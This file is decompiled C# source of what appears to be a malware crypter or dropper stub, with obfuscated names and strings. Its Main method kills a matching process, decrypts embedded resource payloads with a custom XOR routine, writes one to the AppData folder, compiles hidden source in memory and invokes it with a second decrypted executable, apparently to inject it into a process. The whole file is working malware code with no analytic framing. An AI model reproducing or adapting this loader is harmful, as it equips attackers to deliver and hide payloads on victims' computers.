using System;
using System.CodeDom.Compiler;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Resources;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

public class GClass0
{
	private static string uyNXrGsfGcbEkDosS;

	private static string sExQNjGeWSeuKfTcz;

	private static string uYaHbgoeKSTRWtBIm;

	private static string yxOSVMlBtdLOiLPdZ;

	[DebuggerNonUserCode]
	public GClass0()
	{
	}

	[STAThread]
	public static void Main()
	{
		ResourceManager resourceManager = new ResourceManager("V", Assembly.GetExecutingAssembly());
		string text = Conversions.ToString(Operators.ConcatenateObject((object)(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\"), Operators.AddObject(resourceManager.GetObject("Nomdeinject"), (object)vPuSkKkvpIrOxJOLW("ĥŅŘĸ\u008e", "iRREqRnBPvNzEdRPJ"))));
		try
		{
			Process process = null;
			Process[] processes = Process.GetProcesses();
			int num = 0;
			if (0 < processes.Length)
			{
				process = processes[num];
				if (!text.Contains(process.ProcessName))
				{
					goto IL_0078;
				}
			}
			process.Kill();
			goto IL_0078;
			IL_0078:
			if (File.Exists(text))
			{
				File.Delete(text);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			File.WriteAllBytes(text, JWvvWfrUnTqJiJUOg(Convert.FromBase64String(Conversions.ToString(resourceManager.GetObject("filenativeI"))), (byte[])resourceManager.GetObject("Klepassfile")));
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		lhWqhYlveeSEfCOcK("XVV", "Rrocb", afQJQuVHXadVtXClh(qkrVihxCEvVkcNuwS(Conversions.ToString(resourceManager.GetObject("lepeenstring")))), new object[2]
		{
			JWvvWfrUnTqJiJUOg(Convert.FromBase64String(Conversions.ToString(resourceManager.GetObject("Flafilepe"))), (byte[])resourceManager.GetObject("Klepassfile")),
			text
		});
	}

	public static byte[] JWvvWfrUnTqJiJUOg(byte[] Data, byte[] key)
	{
		object obj = default(object);
		object obj2 = default(object);
		if (ForLoopControl.ForLoopInitObj(obj, (object)(Data.Length - Convert.ToInt32(Conversions.ToString(1), 2)), (object)Convert.ToInt32(Conversions.ToString(0), 2), (object)(-1), ref obj2, ref obj))
		{
			do
			{
				Data[Conversions.ToInteger(obj)] = (byte)(((Data[Conversions.ToInteger(obj)] ^ key[Conversions.ToInteger(Operators.ModObject(obj, (object)key.Length))]) - Data[Conversions.ToInteger(Operators.ModObject(Operators.AddObject(obj, (object)Convert.ToInt32(Conversions.ToString(1), 2)), (object)Data.Length))] + Convert.ToInt32(Conversions.ToString(100000000), 2)) % Convert.ToInt32(Conversions.ToString(100000000), 2));
			}
			while (ForLoopControl.ForNextCheckObj(obj, obj2, ref obj));
		}
		return Data;
	}

	private static bool lhWqhYlveeSEfCOcK(string Class, string Void, Assembly file, object[] Parameters)
	{
		bool result = default(bool);
		try
		{
			Type type = file.GetType(Class);
			if ((object)type != null)
			{
				MethodInfo method = type.GetMethod(Void);
				if ((object)method != null)
				{
					result = Conversions.ToBoolean(method.Invoke(null, Parameters));
					return result;
				}
				return result;
			}
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string vPuSkKkvpIrOxJOLW(string RrfcWolJeDJFRUiEG, string PZUxNfzTNDirrqvgZ)
	{
		char[] array = RrfcWolJeDJFRUiEG.ToCharArray();
		char[] array2 = PZUxNfzTNDirrqvgZ.ToCharArray();
		char[] array3 = new char[RrfcWolJeDJFRUiEG.Length - 2 + 1];
		int num = array[RrfcWolJeDJFRUiEG.Length - 1];
		array[RrfcWolJeDJFRUiEG.Length - 1] = '\0';
		int num2 = 0;
		int num3 = RrfcWolJeDJFRUiEG.Length - 1;
		for (int i = 0; i <= num3; i++)
		{
			if (i < RrfcWolJeDJFRUiEG.Length - 1)
			{
				if (num2 >= array2.Length)
				{
					num2 = 0;
				}
				int num4 = array[i];
				int num5 = array2[num2];
				int value = num4 - num - num5;
				array3[i] = Convert.ToChar(value);
				num2++;
			}
		}
		return new string(array3);
	}

	public static string qkrVihxCEvVkcNuwS(string s)
	{
		string text = null;
		string[] array = s.Split(new char[1] { '|' });
		string[] array2 = array;
		foreach (string text2 in array2)
		{
			try
			{
				text += Conversions.ToString(Strings.Chr((int)Math.Round(Conversions.ToDouble(text2) - Conversions.ToDouble(array[0]))));
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		return text.Remove(0, 1);
	}

	public static string bNRrfcWolJeDJFRUi(string s)
	{
		char[] array = s.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static Assembly afQJQuVHXadVtXClh(string RrfcWolJeDJFRUiEG)
	{
		//IL_0052: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		CompilerResults val = null;
		uyNXrGsfGcbEkDosS = vPuSkKkvpIrOxJOLW("ĿŋūļŢŵ\u008e", "njuMbwktRMprYrxGu");
		sExQNjGeWSeuKfTcz = vPuSkKkvpIrOxJOLW("ĬżŤŧŬŝģŧūŔ\u008e", "KuceybguqZmMMnwJk");
		uYaHbgoeKSTRWtBIm = vPuSkKkvpIrOxJOLW("œƀŃōśŞăĤŞűľŌĿŬŠũŮĮūļŅ\u008e", "ryBKhcGIouOWLqmml");
		yxOSVMlBtdLOiLPdZ = vPuSkKkvpIrOxJOLW("ĀűţŦŊŤŭţşčŔĠć\u008e", "CsiwHppcdENZCVBYq");
		CompilerParameters val2 = new CompilerParameters();
		CodeDomProvider val3 = CodeDomProvider.CreateProvider(uyNXrGsfGcbEkDosS);
		val2.set_GenerateExecutable(false);
		val2.set_GenerateInMemory(true);
		val2.get_ReferencedAssemblies().Add(sExQNjGeWSeuKfTcz);
		val2.get_ReferencedAssemblies().Add(uYaHbgoeKSTRWtBIm);
		val2.set_CompilerOptions(yxOSVMlBtdLOiLPdZ);
		val2.set_TreatWarningsAsErrors(false);
		val = val3.CompileAssemblyFromSource(val2, new string[1] { RrfcWolJeDJFRUiEG });
		return val.get_CompiledAssembly();
	}
}
